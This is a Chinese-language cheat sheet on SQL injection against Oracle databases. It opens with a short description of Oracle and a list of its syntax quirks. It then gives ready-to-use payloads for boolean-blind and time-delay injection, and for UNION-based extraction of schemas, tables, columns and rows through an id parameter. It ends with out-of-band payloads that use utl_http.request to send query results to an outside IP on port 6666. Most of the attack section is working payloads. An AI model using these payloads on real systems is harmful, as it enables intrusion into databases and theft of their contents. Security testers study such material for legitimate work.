000 Oracle数据库介绍

Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是目前世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。

001 Oracle数据库特点

oracle数据库查询必须跟from tb_name

union select 前后数据类型必须一致，可以使用null代替。

length()函数返回长度

Oracle无limit

使用 where rownum = 1/2/3/4 数值 来选择显示第几行

and banner not in (‘上一行的值’)

nvl(str,’a’) 判断是否为空，空转换为a

not in 和 <>一样互相可代替

select dstinct(owner from sys.all_tables)去重

Oracle数据库使用||进行字符串的拼接 'a'||'b'

Oracle数据库报错注入

布尔盲注

decode()、instr()

decode()函数

decode(substr(str,1,1),’a’,1,0) 第一位与a对比，一样返回 1，否则返回0

where instr(substr(str,1,1),’1’)=1

where ascii(substr(str,1,1))>100

dbms_pipe.receive+message(‘a’,3) from dual 时间延迟

a可以使用chr()

decode(substr(str,1,1),’a’,dbms_pipe.receive+message(‘a’,3),0)

oracle外带注入

utl_http.request()函数

select utl_http.request('http://ip/?data='||(select owner from all_tables where rownum=1)) from dual;

oracle注入中的联合查询注入

0x001判断数据库类型

payload: ?id=1 and exists(select * from dual)

0x002 获取查询列数

payload: ?id=1 order by 4 – +

0x003 判断显示位以及各位的数据类型

payload: ?id=-1 union select 1,’a’,3,4 from dual – +

0x004 获取到test数据库

payload: ?id=-1 union select 1,owner,3,4 from (select owner,ROWNUM as limit from (select DISTINCT(owner) from sys.all_tables)) where limit=17 – +

0x005 获取test库下的表

payload:?id=-1 union select 1,CAST(table_name as varchar(400)),3,2 from (select table_name,rownum as LIMIT from (select DISTINCT(table_name) from all_tables where owner=’TEST’)) where LIMIT=1 – +

0x006 获取DEMO表下的字段

payload: ?id=-1 union select 1,CAST(column_name as varchar(400)),3,2 from (select column_name,rownum as LIMIT from (select DISTINCT(column_name) from user_tab_columns where table_name=’DEMO’)) where LIMIT=1 – +

四个字段分别为：id name age sex

0x007 获取DEMO表的第三行数据

payload: ?id=-1 union select 1,cast(id||’‘||name||’‘||sex||’~’||age as varchar(4000)),2,3 from (select id,name,sex,age,rownum as LIMIT from demo) where LIMIT=3 – +

oracle注入中的外带数据注入

0x001 获取test数据库

payload: ?id=1 and utl_http.request(‘http://xx.xx.x.xx:6666/?data='||(select owner from (select owner,ROWNUM as limit from (select DISTINCT(owner) from sys.all_tables)) where limit=17))=1 – +

0x002 获取test库下的DEMO表

payload: ?id=-1 and utl_http.request(‘http://xx.xx.x.x:6666/?data='||(select CAST(table_name as varchar(400)) from (select table_name,rownum as LIMIT from (select DISTINCT(table_name) from all_tables where owner=’TEST’)) where LIMIT=1))=1 – +

0x003 获取DEMO表中的字段

payload: ?id=-1 and utl_http.request(‘http://xx.xx.xx.x:6666/?data='||(select CAST(column_name as varchar(400)) from (select column_name,rownum as LIMIT from (select DISTINCT(column_name) from user_tab_columns where table_name=’DEMO’)) where LIMIT=5))=1 – +

0x004 获取DEMO的第四行数据

payload：?id=-1 and utl_http.request(‘http://x.x.x.x:6666/?data='||(select cast(id||’‘||name||’‘||sex||’~’||age as varchar(4000)) from (select id,name,sex,age,rownum as LIMIT from demo) where LIMIT=4))=1 – +
